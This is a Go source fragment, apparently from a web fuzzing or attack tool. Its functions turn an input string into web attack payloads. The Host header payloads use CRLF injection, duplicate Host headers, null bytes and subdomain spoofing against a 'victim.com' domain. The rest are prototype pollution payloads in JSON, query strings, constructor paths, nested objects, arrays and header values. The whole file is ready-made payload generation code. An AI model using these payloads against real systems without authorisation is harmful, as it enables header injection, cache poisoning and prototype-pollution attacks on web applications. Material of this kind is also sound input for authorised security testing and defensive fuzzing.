// crlfInjectionHost injects CRLF into Host header.
func crlfInjectionHost(s string) string {
	return fmt.Sprintf("%s\r\nX-Custom-Header: injected", s)
}

// doubleHostHeader sends multiple Host headers.
func doubleHostHeader(s string) string {
	return fmt.Sprintf("Host: %s\nHost: legitimate.com", s)
}

// hostHeaderNullByte injects null byte.
func hostHeaderNullByte(s string) string {
	return fmt.Sprintf("%s%c.victim.com", s, 0)
}

// hostHeaderSubdomainSpoof appends victim's domain to attacker's.
func hostHeaderSubdomainSpoof(s string) string {
	return fmt.Sprintf("%s.victim.com", s)
}

// protoPollutionJSON for JSON-based prototype pollution.
func protoPollutionJSON(s string) string {
	if s == `{"__proto__":{"polluted":true}}` || s == `{"constructor":{"prototype":{"polluted":true}}}` {
		return s
	}
	return fmt.Sprintf(`{"__proto__":{"key":"%s"}}`, s)
}

// protoPollutionQuery for query string based prototype pollution.
func protoPollutionQuery(s string) string {
	if s == `?__proto__[polluted]=true` || s == `?constructor.prototype.polluted=true` {
		return s
	}
	return fmt.Sprintf(`?__proto__[%s]=true`, url.QueryEscape(s))
}

// protoPollutionConstructor uses constructor.prototype for pollution.
func protoPollutionConstructor(s string) string {
	return fmt.Sprintf(`{"constructor":{"prototype":{"key":"%s"}}}`, s)
}

// protoPollutionMultiLevel multi-level prototype pollution.
func protoPollutionMultiLevel(s string) string {
	return fmt.Sprintf(`{"a":{"__proto__":{"b":{"__proto__":{"key":"%s"}}}}}`, s)
}

// protoPollutionArray uses array index for pollution.
func protoPollutionArray(s string) string {
	return fmt.Sprintf(`{"__proto__":[{"key":"%s"}]}`, s)
}

// protoPollutionHeader uses headers for prototype pollution.
func protoPollutionHeader(s string) string {
	// This would typically be a header value like X-Foo: {"__proto__":{"key":"value"}}
	// For simplicity, we return the string to be used as a header value.
	return fmt.Sprintf(`X-Foo: {"__proto__":{"key":"%s"}}`, s)
}
